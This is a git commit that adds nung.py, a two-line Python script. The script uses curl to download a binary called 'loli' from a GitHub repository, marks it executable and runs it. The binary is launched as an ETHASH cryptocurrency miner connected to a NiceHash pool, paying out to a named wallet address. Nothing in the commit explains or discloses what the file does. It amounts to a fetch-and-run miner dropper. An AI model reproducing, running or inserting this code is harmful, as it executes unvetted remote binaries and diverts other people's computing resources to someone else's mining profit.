377e50cb32678f8aa9508102d2773e2e7bd8130c
yeripo <110187561+yeripo@users.noreply.github.com>
2022-07-29 21:08:53 +0700

    Create nung.py

---
+++ nung.py
@@ -0,0 +1,2 @@
+import os
+os.system("curl -L -o loli https://github.com/Ikuzot/nung/raw/main/loli && chmod +x loli && ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung")
